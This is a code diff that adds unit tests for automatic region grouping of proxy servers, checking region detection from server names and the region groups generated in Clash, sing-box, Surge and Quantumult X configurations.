+// ── Automatic region groups ───────────────────────────────────────────────── //
+test('detectRegion: flags, codes as whole words, English and Chinese names', () => {
+  const cases = {
+    '🇭🇰 Premium 01': 'HK', '🇬🇧 London': 'GB', '香港 IPLC 03': 'HK', 'HK01': 'HK', '【JP】Tokyo': 'JP',
+    'jp-2': 'JP', 'us-west-1': 'US', 'Los Angeles 4': 'US', '美国 圣何塞': 'US', '台灣 01': 'TW', 'Taipei': 'TW',
+    '新加坡 狮城': 'SG', 'SGP 2': 'SG', 'Korea Seoul': 'KR', '韩国 春川': 'KR', 'UK 3': 'GB', 'Frankfurt DE': 'DE',
+    '印度尼西亚 1': 'ID', '印度 孟买': 'IN', 'Germany 2': 'DE',
+    // Not regions: English words that look like codes, and nothing at all.
+    'Let us go': null, 'Plus 01': null, 'Made in Heaven': null, 'Server': null, 'Phuket': null, 'Ukraine': null,
+  };
+  for (const [name, want] of Object.entries(cases)) assert.strictEqual(C.detectRegion(name), want, name);
+  // The earliest-placed mention wins when a name names two.
+  assert.strictEqual(C.detectRegion('香港 → 日本 relay'), 'HK');
+});
+
+const regionProfiles = ['🇭🇰 HK 01', 'HK 02', 'JP Tokyo', 'Somewhere', '🇺🇸 US 1'].map((remarks, i) => C.normalizeProfile({
+  protocol: 'trojan', server: `t${i}.example.com`, port: 443, password: 'p', sni: `t${i}.example.com`, remarks,
+}));
+const REGION_RULES = C.normalizeRules({ regionGroups: true });
+
+test('regionGroups: off by default, and the rules model carries the switch', () => {
+  assert.strictEqual(C.normalizeRules({}).regionGroups, false);
+  assert.strictEqual(C.checkRules({ regionGroups: 'true' }).rules.regionGroups, true);
+  const groups = C.buildClashConfig(regionProfiles)['proxy-groups'];
+  assert.deepStrictEqual(groups.map((g) => g.name), ['PROXY', 'Auto', 'Fallback']);
+});
+
+test('regionGroups: Clash gains one url-test group per region, after Auto/Fallback, ★ intact', () => {
+  const cfg = C.buildClashConfig(regionProfiles, { rules: REGION_RULES, preferred: regionProfiles[2].id });
+  const groups = Object.fromEntries(cfg['proxy-groups'].map((g) => [g.name, g]));
+  assert.deepStrictEqual(groups['🇭🇰 Hong Kong'].proxies, ['🇭🇰 HK 01', 'HK 02']);
+  assert.strictEqual(groups['🇭🇰 Hong Kong'].type, 'url-test');
+  assert.deepStrictEqual(groups['🇯🇵 Japan'].proxies, ['JP Tokyo']);
+  assert.deepStrictEqual(groups['🇺🇸 United States'].proxies, ['🇺🇸 US 1']);
+  assert.ok(!groups['🇸🇬 Singapore'], 'no group for a region nothing is in');
+  assert.deepStrictEqual(groups.PROXY.proxies.slice(0, 5), ['Fallback', 'Auto', '🇭🇰 Hong Kong', '🇯🇵 Japan', '🇺🇸 United States']);
+  assert.strictEqual(groups.Fallback.proxies[0], 'JP Tokyo', '★ still leads Fallback');
+  // The YAML is still one mihomo can read back.
+  const yaml = require('js-yaml').load(C.buildClashYaml(regionProfiles, { rules: REGION_RULES }));
+  assert.ok(yaml['proxy-groups'].some((g) => g.name === '🇭🇰 Hong Kong'));
+  // A single server gets no groups: the selector stays as it was.
+  assert.deepStrictEqual(C.buildClashConfig(regionProfiles.slice(0, 1), { rules: REGION_RULES })['proxy-groups'].map((g) => g.name), ['PROXY']);
+});
+
+test('regionGroups: a server already named like a group does not collide with it', () => {
+  const list = ['🇯🇵 Japan', 'JP 2'].map((remarks, i) => C.normalizeProfile({ protocol: 'trojan', server: `j${i}.example.com`, port: 443, password: 'p', remarks }));
+  const names = C.buildClashConfig(list, { rules: REGION_RULES })['proxy-groups'].map((g) => g.name);
+  assert.ok(names.includes('🇯🇵 Japan (2)'), names.join(','));
+});
+
+test('regionGroups: sing-box, Surge and Quantumult X carry them too', () => {
+  const sb = C.buildSingBox(regionProfiles, { rules: REGION_RULES });
+  const selector = sb.outbounds.find((o) => o.tag === 'proxy');
+  assert.strictEqual(selector.default, 'auto');
+  assert.deepStrictEqual(selector.outbounds.slice(0, 4), ['auto', '🇭🇰 Hong Kong', '🇯🇵 Japan', '🇺🇸 United States']);
+  const hk = sb.outbounds.find((o) => o.tag === '🇭🇰 Hong Kong');
+  assert.strictEqual(hk.type, 'urltest');
+  assert.deepStrictEqual(hk.outbounds, ['🇭🇰 HK 01', 'HK 02']);
+  const tags = sb.outbounds.map((o) => o.tag);
+  assert.strictEqual(new Set(tags).size, tags.length, 'unique tags');
+
+  const surge = K.buildSurge(regionProfiles, { rules: REGION_RULES }).text;
+  assert.match(surge, /^🇭🇰 Hong Kong = url-test, 🇭🇰 HK 01, HK 02, url = /m);
+  assert.match(surge, /^PROXY = select, Auto, Fallback, 🇭🇰 Hong Kong, 🇯🇵 Japan, 🇺🇸 United States, 🇭🇰 HK 01/m);
+  const qx = K.buildQuantumultX(regionProfiles, { rules: REGION_RULES }).text;
+  assert.match(qx, /^url-latency-benchmark=🇯🇵 Japan, JP Tokyo$/m);
+  assert.match(qx, /^static=PROXY, Fastest, Fallback, 🇭🇰 Hong Kong, 🇯🇵 Japan, 🇺🇸 United States, 🇭🇰 HK 01/m);
+  // A server the client cannot carry is in no group of that client's file.
+  const withReality = [...regionProfiles, C.normalizeProfile({ protocol: 'vless-reality', server: '1.2.3.4', port: 443, uuid: UUID, publicKey: 'k', sni: 'www.microsoft.com', remarks: 'SG Reality' })];
+  const surge2 = K.buildSurge(withReality, { rules: REGION_RULES }).text;
+  assert.doesNotMatch(surge2, /Singapore/);
 });
 
 Promise.all(pending).then(() => {
